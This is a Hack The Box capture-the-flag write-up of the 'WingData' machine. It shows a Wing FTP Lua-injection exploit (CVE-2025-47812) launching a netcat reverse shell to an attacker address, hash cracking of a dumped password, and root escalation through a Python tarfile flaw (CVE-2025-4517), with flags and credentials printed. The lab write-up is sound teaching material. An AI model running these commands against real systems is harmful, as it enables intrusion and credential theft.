---
layout: ../../layouts/MarkdownLayout.astro
title: HTB - WingData
date: 2026-02-14
difficulty: Easy
tags: [Linux]
---

## RECONNAISSANCE

Initial reconnaissance with `nmap`:

```bash
nmap -p- -sV -vv -T4 10.129.244.106 -oA wingData
```

The scan revealed the following open ports:

| Port | Service | Version                        |
| ---- | ------- | ------------------------------ |
| 20   | ssh     | OpenSSH 9.2p1 Debian 2+deb12u7 |
| 80   | HTTP    | Apache httpd 2.4.66            |

## Enumeration

### Web Application Analysis

Adding `10.129.244.106 wingdata.htb ftp.wingdata.htb` to `/etc/hosts` and navigating to `http://wingdata.htb` reveals the main site. Clicking the **Client Portal** link redirects to `ftp.wingdata.htb`.

![wingData-home](/htb/wingdata/wingdata1.png)

The login page for the FTP portal reveals its version at the bottom of the page: **Wing FTP Server v7.4.3**

![wingData-home](/htb/wingdata/wingdata2.png)

## Vulnerability Assessment

### CVE-2025-47812

> CVE-2025-29927  
> InWing FTP Server before 7.4.4. the user and admin web interfaces mishandle '\0' bytes, ultimately allowing injection of arbitrary Lua code into user session file.

#### Remote Code Execution

Cloning the public PoC:

```bash
git clone https://github.com/4m3rr0r/CVE-2025-47812-poc.git
```

Confirming the target is vulnerable with a `whoami` probe:

```bash
python3 cve.py -u http://ftp.wingdata.htb -v -c "whoami"
[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'whoami' and username: 'anonymous'
[+] UID extracted: 20475b80187e8c76d302e1f68169575df528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 20475b80187e8c76d302e1f68169575df528764d624db129b32c21fbca0cb8d6

--- Command Output ---
wingftp
----------------------
```

Setting up a listener and sending a reverse shell:

```bash
# Attack machine
nc -lvnp 9001
```

```bash
python3 cve.py -u http://ftp.wingdata.htb -v -c "nc -e /bin/sh 10.10.14.45 9001"
```

Upgrading to a full interactive shell:

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
wingftp@wingdata:/opt/wftpserver$
```

### Credential Extraction

Wing FTP Server stores user configuration in XML files under its data directory. Examining the config for user `wacky`:

```bash
wingftp@wingdata:/opt/wftpserver/Data/1$ cat users/wacky.xml | grep "Password"
        <EnablePassword>1</EnablePassword>
        <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
        <PasswordLength>0</PasswordLength>
        <CanChangePassword>0</CanChangePassword>
```

Wing FTP salts its hashes with the static string `WingFTP`, appended to the plaintext before hashing. Hashcat mode `1410` handles `SHA256:salt` format:

```bash
echo '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP' > hash
hashcat -m 1410 hash /usr/share/wordlists/rockyou.txt

32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
```

Key findings:

- wacky : !#7Blushing^\*Bride5

## Privilege Escalation

ssh login

```bash
ssh wacky@wingdata.htb
```

User flag:

```bash
wacky@wingdata:~$ cat user.txt
75943c1276dcb473465abb2c3cafe2ca
```

Sudo permissions `sudo-l`

```bash
wacky@wingdata:~$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

Key observations:

- `wacky` can run a specific Python script as `root` without a password
- The wildcard `*` allows arbitrary arguments to be passed to the script

### CVE-2025-4517

Reviewing the script reveals it extracts `.tar` archives as root using Python's `tarfile` module:

```bash
#!/usr/bin/env python3
import tarfile
import os
import sys
import re
import argparse

BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE = "/opt/backup_clients/restored_backups"

def validate_backup_name(filename):
    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
        return False
    client_id = filename.split('_')[1].rstrip('.tar')
    return client_id.isdigit() and client_id != "0"

def validate_restore_tag(tag):
    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))

def main():
    parser = argparse.ArgumentParser(
        description="Restore client configuration from a validated backup tarball.",
        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
    )
    parser.add_argument(
        "-b", "--backup",
        required=True,
        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "
             "where <client_id> is a positive integer, e.g., backup_1001.tar)"
    )
    parser.add_argument(
        "-r", "--restore-dir",
        required=True,
        help="Staging directory name for the restore operation. "
             "Must follow the format: restore_<client_user> (e.g., restore_john). "
             "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
    )

    args = parser.parse_args()

    if not validate_backup_name(args.backup):
        print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)
        sys.exit(1)

    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
    if not os.path.isfile(backup_path):
        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
        sys.exit(1)

    if not args.restore_dir.startswith("restore_"):
        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
        sys.exit(1)

    tag = args.restore_dir[8:]
    if not tag:
        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
        sys.exit(1)

    if not validate_restore_tag(tag):
        print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
        sys.exit(1)

    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
    print(f"[+] Backup: {args.backup}")
    print(f"[+] Staging directory: {staging_dir}")

    os.makedirs(staging_dir, exist_ok=True)

    try:
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")
        print(f"[+] Extraction completed in {staging_dir}")
    except (tarfile.TarError, OSError, Exception) as e:
        print(f"[!] Error during extraction: {e}", file=sys.stderr)
        sys.exit(2)

if __name__ == "__main__":
    main()
```

> **CVE-2025-4517**  
> This exploit leverages CVE-2025-4517, a critical vulnerability in Python's tarfile module that allows arbitrary file write through a combination of symlink path traversal and hardlink manipulation.

Cloning the PoC and serving it:

```bash
# Attack machine
git clone https://github.com/AzureADTrent/CVE-2025-4517-POC
cd CVE-2025-4517-POC
python3 -m http.server
```

Downloading and executing on the target:

```bash
wacky@wingdata:/tmp$ wget http://10.10.14.45:8000/CVE-2025-4517-POC.py
wacky@wingdata:/tmp$ python3 CVE-2025-4517-POC.py
```

Root flag:

```bash
root@wingdata:/tmp# cat /root/root.txt
259e2fdd9d6c29a628e2ae45f27d100f
```
